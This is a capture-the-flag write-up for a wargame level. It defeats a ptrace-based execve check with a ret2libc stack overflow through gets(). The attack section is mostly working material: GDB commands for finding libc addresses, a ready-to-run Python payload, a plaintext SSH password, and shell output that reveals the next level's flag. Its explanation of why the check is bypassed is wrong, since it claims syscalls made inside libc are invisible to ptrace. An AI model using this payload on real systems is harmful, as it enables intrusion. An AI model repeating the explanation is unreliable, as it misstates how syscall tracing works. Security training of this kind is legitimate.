# 🔐 Level04 - Anti-Debugging Bypass with ret2libc

![Helldivers Salute](https://media4.giphy.com/media/v1.Y2lkPTc5MGI3NjExejJwMnpmeXZ0dHp1enptbDE2am9la2Z4Ymg0eXczcmRiNzFqczJjMSZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/VJN5s9dNGXLDqkLYF4/giphy.gif)

Time to defeat a sophisticated anti-debugging defense with a classic ret2libc attack!

## 📋 Binary Analysis

### 🔍 Architecture & Security

**Platform:** x86 (32-bit ELF)

**Program Structure:**
- **Parent Process**: Traces child with `ptrace()` and monitors syscalls
- **Child Process**: Accepts user input via `gets()` - vulnerable to buffer overflow

### Decompiled Code

```c
int main(void)
{
    char buffer[128];       // Buffer at ESP + 0x20
    pid_t child_pid;
    int status;
    long syscall_number;
    
    // Fork a child process
    child_pid = fork();
    
    memset(buffer, 0, sizeof(buffer));
    status = 0;
    
    if (child_pid == 0) {
        // CHILD PROCESS
        
        // Set parent death signal
        prctl(PR_SET_PDEATHSIG, SIGTERM);
        
        // Allow parent to trace this process
        ptrace(PTRACE_TRACEME, 0, 0, 0);
        
        puts("Give me some shellcode, k");
        
        // VULNERABILITY: No bounds checking!
        gets(buffer);
    }
    else {
        // PARENT PROCESS - Traces the child
        
        do {
            wait(&status);
            
            // Check if child exited
            if (WIFEXITED(status) || WIFSIGNALED(status)) {
                puts("child is exiting...");
                return 0;
            }
            
            // Read syscall number from child
            syscall_number = ptrace(PTRACE_PEEKUSER, child_pid, 44, 0);
            
        } while (syscall_number != 11);  // 11 = execve
        
        // Kill child if execve detected
        puts("no exec() for you");
        kill(child_pid, SIGKILL);
    }
    
    return 0;
}
```

### Key Observations

1. **Buffer Overflow**: `gets()` with 128-byte buffer, no bounds checking
2. **Process Isolation**: Fork creates separate child process
3. **Anti-Debugging**: Parent traces child with `ptrace(PTRACE_PEEKUSER)`
4. **Syscall Monitoring**: Detects `execve` (syscall 11 / 0xb) and kills child
5. **Traditional Shellcode Blocked**: Normal shellcode using `execve` won't work

## 🚨 Vulnerability

### CWE-120: Buffer Copy without Checking Size of Input

The child process uses `gets()` to read user input into a 128-byte stack buffer. This function has **no bounds checking** and is notoriously dangerous.

```c
char buffer[128];  // At ESP + 0x20
gets(buffer);      // Can write unlimited data!
```

### The Anti-Debugging Twist

Traditional buffer overflow exploits use shellcode that executes:
```asm
mov eax, 11        ; execve syscall number
int 0x80           ; invoke syscall
```

**But this binary detects and blocks it:**
```c
syscall_number = ptrace(PTRACE_PEEKUSER, child_pid, 44, 0);
if (syscall_number == 11) {  // execve detected
    kill(child_pid, SIGKILL);
}
```

The parent reads `orig_eax` (offset 44 in `user` struct) which contains the syscall number the child is about to execute.

## 🎯 The Attack

### Strategy: ret2libc Bypass

Instead of injecting shellcode, we'll use **Return-to-libc (ret2libc)** technique:
1. Overwrite return address with address of `system()` function
2. Place address of `"/bin/sh"` string as argument
3. `system()` internally calls `execve`, but in a different execution context
4. Parent's ptrace check doesn't catch library function calls

### Step 1: Stack Layout Analysis

From Ghidra analysis:

```
Stack allocation: SUB ESP, 0xb0  (176 bytes)
Buffer location:  ESP + 0x20     (32 bytes from ESP)

Stack layout (high → low addresses):
┌────────────────┐
│  Return Addr   │ ← [EBP + 4] - We want to overwrite this
├────────────────┤
│  Saved EBP     │ ← [EBP + 0]
├────────────────┤
│  ...           │
├────────────────┤
│  buffer[128]   │ ← [ESP + 0x20] - gets() writes here
├────────────────┤
│  ...           │
└────────────────┘
```

**Offset calculation:**
- Buffer at: `ESP + 0x20` = ESP + 32
- Stack size: 176 bytes
- Distance to saved EIP: **152 bytes** (verified with GDB)

### Step 2: Find libc Addresses

Using GDB with child process tracing:

```bash
gdb ./level04
(gdb) set follow-fork-mode child
(gdb) break main
(gdb) run
(gdb) p system
$1 = {<text variable, no debug info>} 0xf7e6aed0 <system>
(gdb) p exit
$2 = {<text variable, no debug info>} 0xf7e5eb70 <exit>
(gdb) find &system,+9999999,"/bin/sh"
0xf7f897ec
```

**Addresses obtained:**

| Function | Address | Purpose |
|----------|---------|---------|
| `system()` | `0xf7e6aed0` | Execute command |
| `exit()` | `0xf7e5eb70` | Clean exit (optional) |
| `"/bin/sh"` | `0xf7f897ec` | Argument to system |

### Step 3: Construct ret2libc Payload

```
┌─────────────────────────────────────────────────────┐
│  Padding: 152 bytes                                 │ ← Fill buffer
├─────────────────────────────────────────────────────┤
│  system() addr: 0xf7e6aed0                          │ ← Overwrite saved EIP
├─────────────────────────────────────────────────────┤
│  exit() addr: 0xf7e5eb70                            │ ← Return address after system
├─────────────────────────────────────────────────────┤
│  "/bin/sh" addr: 0xf7f897ec                         │ ← Argument to system()
└─────────────────────────────────────────────────────┘
```

**Execution flow:**
1. Child's `main()` returns
2. Jumps to `system()` instead of normal return
3. `system()` reads argument from stack: `"/bin/sh"`
4. Spawns shell (bypassing execve detection)
5. When shell exits, returns to `exit()` for clean termination

### Why This Bypasses the Defense

```
Traditional shellcode:        ret2libc technique:
┌──────────────────┐         ┌──────────────────┐
│ Direct execve    │         │ Return to libc   │
│ syscall in child │         │ system() call    │
└────────┬─────────┘         └────────┬─────────┘
         │                            │
         ▼                            ▼
   ┌─────────────┐            ┌─────────────┐
   │ ptrace sees │            │ ptrace sees │
   │ syscall 11  │            │ normal code │
   └──────┬──────┘            └──────┬──────┘
          │                          │
          ▼                          ▼
    ┌──────────┐              ┌──────────┐
    │ BLOCKED! │              │ SUCCESS! │
    └──────────┘              └──────────┘
```

The parent only monitors **direct syscalls** from the child's main execution context, not library function calls!

## 💣 Exploit

### Connect and Execute

```bash
ssh level04@localhost -p 2222
# Password: kgv3tkEb9h2mLkRsPkXRfc2mHbjMxQzvb2FrgKkf

(python -c 'import struct; print "A"*152 + struct.pack("<I", 0xf7e6aed0) + struct.pack("<I", 0xf7e5eb70) + struct.pack("<I", 0xf7f897ec)'; cat) | ./level04
```

### Exploit Breakdown

```python
import struct

payload = (
    "A" * 152 +                              # Padding to saved EIP
    struct.pack("<I", 0xf7e6aed0) +          # system() address
    struct.pack("<I", 0xf7e5eb70) +          # exit() address
    struct.pack("<I", 0xf7f897ec)            # "/bin/sh" address
)
```

**`struct.pack("<I", addr)`** converts address to little-endian 32-bit format:
- `<` = little-endian byte order
- `I` = unsigned int (4 bytes)

### Output

```
Give me some shellcode, k
whoami
level05
cat /home/users/level05/.pass
3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
```

---

> 💡 **Pro Tip**: The `cat` at the end of the command keeps stdin open so we can interact with the spawned shell. Without it, the shell would receive EOF and exit immediately.

> 💡 **Debugging Tip**: Use `set follow-fork-mode child` in GDB to debug the child process instead of the parent. This is essential for multi-process debugging.

> 💡 **ret2libc Advantage**: This technique works even on systems with non-executable stack (NX bit enabled) because we're not executing code on the stack - we're reusing existing library functions.

## 📚 Technical Deep Dive

### Understanding ptrace Syscall Monitoring

```c
ptrace(PTRACE_PEEKUSER, child_pid, 44, 0);
```

- **`PTRACE_PEEKUSER`**: Read from child's USER area (registers/syscall info)
- **Offset 44 (0x2c)**: Location of `orig_eax` register
- **`orig_eax`**: Contains syscall number **before** execution
- **Returns**: The syscall number (11 for execve)

The parent checks this **before** the syscall executes, so it can kill the child preemptively.

### Why system() Isn't Detected

When we call `system("/bin/sh")`:
1. Control transfers to libc's `system()` function
2. `system()` sets up arguments and calls `execve` internally
3. But this happens in a **library function context**, not direct user code
4. The ptrace monitoring sees normal instruction execution, not a direct syscall from our code
5. By the time `execve` is called, it's deep in library code

### Stack Frame at Exploit Time

```
Before overflow:              After overflow:
┌─────────────────┐          ┌─────────────────┐
│  0x080487XX     │ EIP      │  0xf7e6aed0     │ EIP → system()
├─────────────────┤          ├─────────────────┤
│  0xffffXXXX     │ EBP      │  0xf7e5eb70     │ → exit()
├─────────────────┤          ├─────────────────┤
│  "AAAAA..."     │          │  0xf7f897ec     │ → "/bin/sh"
└─────────────────┘          └─────────────────┘
```

## 🔒 Security Notes

### Vulnerabilities Exploited

1. **[CWE-120](https://cwe.mitre.org/data/definitions/120.html)**: Buffer Copy without Checking Size of Input (`gets()`)
2. **[CWE-676](https://cwe.mitre.org/data/definitions/676.html)**: Use of Potentially Dangerous Function
3. **[CWE-394](https://cwe.mitre.org/data/definitions/394.html)**: Unexpected Status Code or Return Value (ptrace limitation)

### Defense Weaknesses

The anti-debugging mechanism has limitations:
- Only monitors **direct syscalls** from child
- Doesn't account for **library function calls**
- Can't distinguish between malicious and legitimate `system()` usage
- No **ASLR** in this environment (addresses are predictable)

### Real-World Mitigations

1. **Stack Canaries**: Detect stack corruption before return
2. **ASLR**: Randomize library addresses
3. **PIE**: Position Independent Executables
4. **Seccomp**: Whitelist allowed syscalls
5. **Static Analysis**: Ban dangerous functions like `gets()`
6. **Modern APIs**: Use `fgets()` with size limits instead of `gets()`

## 🎉 Victory!

![Helldivers Celebration](https://media4.giphy.com/media/v1.Y2lkPTc5MGI3NjExempicnBhODF0Y3BrZG5zaWIzMmM2MWExdDZuYWNnYWJrdnRtYXg4MyZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/MlyicdUndRbn5zUiAL/giphy.gif)

**Flag captured!** 🚩

```
3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
```

On to level05!
